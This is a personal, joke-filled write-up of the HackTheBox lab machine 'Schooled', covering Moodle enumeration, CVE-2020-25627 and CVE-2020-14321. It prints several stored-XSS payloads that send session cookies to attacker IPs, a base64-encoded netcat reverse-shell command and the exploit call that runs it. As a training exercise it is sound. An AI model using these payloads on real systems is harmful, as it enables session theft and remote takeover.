# Schooled Helped-Through

Name: Schooled
Date:  28/4/2024
Difficulty:  Medium
Goals:  
- Test whether Guided track is good for my overall learning
- Finish in a sitting
Learnt:
Beyond Root:
- Twinned with  [[RedCross-Writeup]]

- [[Schooled-Notes.md]]
- [[Schooled-CMD-by-CMDs.md]]

Time to also get [schooled](https://www.youtube.com/watch?v=R0ODb4yhKXY)!
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Unfortunately I needed to rescan port that was like a [A Lotus on a Irish Stream](https://www.youtube.com/watch?v=1m5V8zbyR2M), 33060

**Task 1: How many open TCP ports are listening on Schooled?**
```python
# 22,80,33060
3
```

![](terrapin.png)

- CVE-2021-21702 if SOAP and xml can be passed to client
	- https://www.rapid7.com/db/vulnerabilities/php-cve-2021-21702/
	- https://www.tenable.com/plugins/was/112701

![](schooled-www-root.png)

![](hostname.png)

![](teachersasusersnames.png)

Proof that we cannot even contact these teachers at schooled...the parents' evenings must be brutal or the telephone on constantly engaged.
![](asdcontact.png)
Queue telephone on hold music.
![](validasdasd.png)

The testimonals boarder on the realm of pure madness:
![](poorjacques.png)
Slaneeshy followers been drinking that Warp-based corrupted radiator water
![](slaneeshhasatestimonalonthiswebsite.png)

No `root : schooled` on port 33060 for mysql. [House of Mirrors](https://www.youtube.com/watch?v=9J2FWsf3pjU) on the next question as the phrasing made my concerned for where I have any read comprehension after reading those testimonials. 

**Task 2 What is the full domain that hosts an instance of commercially available education software?**
```python
# moodle is not in the first 150k of jHaddix!
moodle.schooled.htb
```

![](moodledomain.png)

![](moodlesearchsploits.png)

![](moodleversionattempt.png)

Weird README from 2007..
![](Martinfrom2007.png)
Site is a bit slow now so just another reminder that even with rate limiting to 100 with feroxbuster something gobuster is just better

![](behatconfig-nuclei.png)

It is very fortunate that I have pick a box at random to finish that includes more XSS or its more statistically likely that I have generally avoided them so eventually I would run into more of them.

XSS on moodle is - https://nvd.nist.gov/vuln/detail/cve-2021-32478
![](xssqueezethemoob.png)
Triangulating the version 
![](triangulateinthemoodleversion.png)

**Task 3 What version of Moodle is running on `moodle.schooled.htb`?**
```
3.9
```

So how many Xovid19-student-skidded this...?
![](xssin2020moodle.png)

**Task 4 What is the 2020 CVE ID for a stored cross-site scripting (XSS) vulnerability in the Moodle profile?**
```
CVE-2020-25627
```

Instructions from https://github.com/HoangKien1020/CVE-2020-25627
```
Step 1: Log in with an authenticated user (Can register or through creating a new user without assigning roles )

Step 2: Quick access to Edit profile

domain/moodle/user/edit.php?id=<your user_id>&returnto=profile

In MoodleNet profile, add the script as:

<script>alert("HK")</script>

And save:

Step 3: Anytime, the other user goes to view your profile, the stored XSS will trigger.

Steal cookie via script:

<script>var i=new Image;i.src="http://192.168.0.238/xss.php?"+document.cookie;</script>

Change your domain and upload xss.php to your host:

https://github.com/HoangKien1020/pentest/tree/master/XSS
```

Trying to think of school-based memes so tiny rick will do
```
tinyrick : Tinyrick123!
```

[Snake Jazz](https://www.youtube.com/watch?v=ahgcD1xjRiQ) for the elevator music continuation 
![](accountcreation.png)

There is a student.schooled.htb domain
![](what.png)

Why do have to enter your email twice, but your password once. Absolute madness.
`tinyrick@student.schooled.htb`

In MoodleNet profile, add the script as:
```html
<img src=x onerror="this.src='http://10.10.14.29/'+document.cookie; this.removeAttribute('onerror');">

<script><img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');"></script>

<!-- https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies -->
<script>fetch('http://10.10.14.73', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<script>fetch('http://10.10.14.29');</script>

<script>fetch('http://10.10.14.29')</script>

<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

![](tinyxsssssssssssss.png)

![](worksbutnowiknow.png)

I authorize myself the right to refer you to the improvised song about cookies - remember to pay you BBC TV lincence for this please: [Reggie on Mock the Week](https://www.youtube.com/watch?v=sGjgPRVMca8)
![](cookiefromthecookiejar.png)
Unfortunately this is mine. Lmao. Unforntunately I now really what to eat cookies..
![](enrollinginmathsforthecookies.png)
And it is definately not my cookie
![](s6mvogqmd40hp3bvoakkqdqt3i.png)

![](weCrossSiteScriptingToManual.png)

I did try to change tiny rick's grade, but it kept refreshing. Never cheating and feeling crap about when I have used a cheat in a single player games even universe is saying no. 

![](thisdidnotsayitwasthisbox1.png)
Which I just skimmed till:
![](thisdidnotsayitwasthisbox.png)

https://github.com/lanzt/CVE-2020-14321 - but I do not know what the zip as base64 actually is... references https://github.com/HoangKien1020/CVE-2020-14321 similarly:

![](cyberchefnolikeythebytey.png)

**Task 6: What is the 2020 CVE ID for a privilege escalation vulnerability that allows a user with the teacher role to get the manager role in Moodle 3.9?**
```
CVE-2020-14321
```

Turn pentest monkey into hex and I also tried with cmd.php.
![](pentestmonkeytohex.png)

But that is excessive and I am too lazy to mod the script to not use the cmd.php
`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzkgODQ0NSA+L3RtcC9m | base64 -d | bash`

```
8vm3o9c3p6iq1ehli9anho6i57
```

![](verynice.png)

The session changed so that is a limitation from my use of it [queue intermission music](https://www.youtube.com/watch?v=5gqaZwsaqD0)- I did read the script yesterday and played around with it, I just have not developed another exploits to think additionally as to what 
![](sessionchanges.png)

Reset and hopeful [Them Changes] will be enough..

URL ENCODING AAAAAAAAAAAAAAAAAAARRGH
```
python3 50180.py http://moodle.schooled.htb/moodle --cookie "8vm3o9c3p6iq1ehli9anho6i57" -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzMgODQ0NSA+L3RtcC9m | base64 -d | bash"
```

 [Madvilliany](https://www.youtube.com/watch?v=oYKwotHRdHo) to RCE before the questions are answered. This is best *your reverse did not work song* [Throw your hate](https://www.youtube.com/watch?v=BS2-qoNHhxY)  for MORE PAYLOADS and [Cantina Music](https://www.youtube.com/watch?v=EsvfptdFXf4) till another Bearing Down to [Bear Town](https://www.youtube.com/watch?v=hEd1JkOHFmk) on Bull to hopeful come along. Back to [Third Stone from the sun again](https://www.youtube.com/watch?v=gtHbxsdExlE), but [not this disconnected to the htb vpn](https://www.youtube.com/watch?v=jRflfPMVhJ4).

```
n3s15k0g258jtsnchfkjuac801 : tinyrick
ul27pa3q9s6qvpkmoci4ln6f9o : manual
```

Ok maybe [Taking Five](https://www.youtube.com/watch?v=tT9Eh8wNMkw) seconds to remember to whatever reason that cmd.php is being placed onto web server in a extreme facepalm. Jazz is very difficult to work to - [video attached](https://www.youtube.com/watch?v=9NuUyPk103o) and sometimes [this gets recommended](https://www.youtube.com/watch?v=CUoQ_G61e7w)

Jazz music while you work is bad M'kay
```python
/blocks/rce/lang/en/block_rce.php?cmd=
```
![](veryslowclapping.png)

Also I think my payload is bad and I should really do one action at a time.
![](whyworkandthennotwork.png)
## Exploit

## Foothold

[Isn't See Lovely](https://www.youtube.com/watch?v=D0Kw7C6LtoY), but is she [Donna Lee](https://www.youtube.com/watch?v=n1tNOLsMZiI)

- If docker container https://www.youtube.com/watch?v=4JkIs37a2JE
- If nohup just used https://www.youtube.com/watch?v=K3lgmnsTdcA 
- - arttutm somewhere
## Privilege Escalation

Now we [Desire](https://www.youtube.com/watch?v=EFeouD2IWSA) root


Start [moanin'](https://www.youtube.com/watch?v=__OSyznVDOY) in a good, educational and reflective way...
## Post-Root-Reflection  

- Impression while going through the machine:
	- It is good preventing hints and defaulting to eventual helped-through by writeup potentially
	- You can switch back to adventure mode
	- Reduces time to completion in an objective based way
	- Dependent on how good the questions are and how much that you translate in wording that then forms part of Question based methodology
	- Did not use notes as much. SO I forget to copy a cookie
	- Conflict of following the question in case I missed something that rabbitholed-me-into-the-moodle-mush



- Conclusion
	- No Guided-Through file types, keep the Writeup and Helped-Through types
	- I need to do a box every now and then where I write my own python exploit.
		- I do have templates from THM AoC 2023 and have done more pwn htb so I feel more comfortable 
		- Is there a better alternative than Python? 
		- Should I switch to mojo now?
	- I need to schedule more practice to get [schooled](https://www.youtube.com/watch?v=R0ODb4yhKXY) again! 
## Beyond Root

**Task **
```

```
